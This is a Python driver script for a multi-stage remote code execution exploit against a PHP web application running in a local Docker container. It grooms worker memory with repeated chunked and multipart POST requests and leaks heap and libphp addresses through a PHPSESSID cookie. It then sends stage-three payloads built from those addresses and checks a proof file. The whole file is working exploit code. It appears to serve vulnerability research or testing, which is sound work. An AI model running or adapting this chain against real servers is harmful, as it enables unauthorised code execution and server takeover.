import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 os.pardir, "exploits"))
import os, subprocess, sys, time
import exploit as E, worker, def_rce
from urllib.parse import unquote_to_bytes
import urllib.request

C = os.environ.get("C", worker.container_name())
URL = os.environ.get("URL",
        "http://127.0.0.1:%d/index.php" % worker.target_port())
PROOF = os.environ.get("PROOF", os.path.join(worker.out_dir(), "pd"))
NHEAVY = int(os.environ.get("NHEAVY", "2"))
NHB = int(os.environ.get("NHB", "1"))
DRAIN = int(os.environ.get("DRAIN", "12"))
worker.C = C
subprocess.run(["docker", "exec", C, "sh", "-c",
                "rm -f /srv/out/pd /tmp/sess_*"], check=True)


def light(tag):
    try:
        urllib.request.urlopen(URL, timeout=10).read()
        return True
    except Exception as e:
        print("light err", tag, e, flush=True)
        return False


pid = worker.fresh_workers()
print("worker", pid, "nheavy", NHEAVY, "drain", DRAIN, flush=True)
t = E.Target(URL, timeout=600.0, verbose=False)

for k in range(NHEAVY):
    body = def_rce.build_stage1_a()
    try:
        r = def_rce.post_chunked(URL, body, b"S" * 17, timeout=600.0)
        print("history A", k, len(r), flush=True)
    except Exception as e:
        print("history A err", e, flush=True)
    if k < NHB:
        try:
            b = def_rce.stage1_b_body()
            rr = t.post(E.build_multipart(b, b"T" * 11), b"T" * 11,
                        read_cap=1 << 20, timeout=60.0)
            print("history B", k, len(rr), flush=True)
        except Exception as e:
            print("history B err", e, flush=True)
    time.sleep(0.2)

for k in range(DRAIN):
    light(k)

ws = worker.workers()
print("worker before chain", ws, flush=True)

body = def_rce.build_stage1_a()
try:
    r = def_rce.post_chunked(URL, body, b"S" * 17, timeout=600.0)
    print("S1 A resp", len(r), flush=True)
except Exception as e:
    print("S1 A err", e, flush=True)
time.sleep(0.3)
b = def_rce.stage1_b_body()
try:
    r = t.post(E.build_multipart(b, b"T" * 11), b"T" * 11,
               read_cap=8 << 20, timeout=120.0)
    print("S1 B resp", len(r), flush=True)
except Exception as e:
    print("S1 B err", e, flush=True)
    sys.exit(1)
i = r.find(b"Set-Cookie: PHPSESSID=")
if i < 0:
    print("NO LEAK COOKIE", flush=True)
    sys.exit(1)
j = r.find(def_rce.CRLF, i)
raw = unquote_to_bytes(r[i:j].split(b"=", 1)[1])[:def_rce.LEAK_LEN]
chunk, libphp = def_rce.parse_leak(raw)
print(f"chunk={chunk:#x} libphp={libphp:#x} raw={len(raw)}", flush=True)
if not chunk or not libphp:
    print("NO LEAK", flush=True)
    sys.exit(1)

a = def_rce.stage3_a_body()
try:
    r = def_rce.post_chunked(URL, E.build_multipart(a, b"S" * 17), b"S" * 17,
                             timeout=600.0)
    print("S3 A resp", len(r), flush=True)
except Exception as e:
    print("S3 A err", e, flush=True)
time.sleep(0.3)
bp, htdata, zif = def_rce.stage3_b_body(chunk, libphp)
try:
    r = t.post(E.build_multipart(bp, b"B" * 10), b"B" * 10,
               read_cap=1 << 20, timeout=120.0)
    print("S3 B resp", len(r), flush=True)
except Exception as e:
    print("S3 B err", e, flush=True)
time.sleep(0.8)
try:
    proof = open(PROOF, "rb").read().decode("latin1").strip()
except OSError:
    proof = ""
print("R0", hex(chunk + def_rce.R0_OFF), "PROOF:", proof, flush=True)
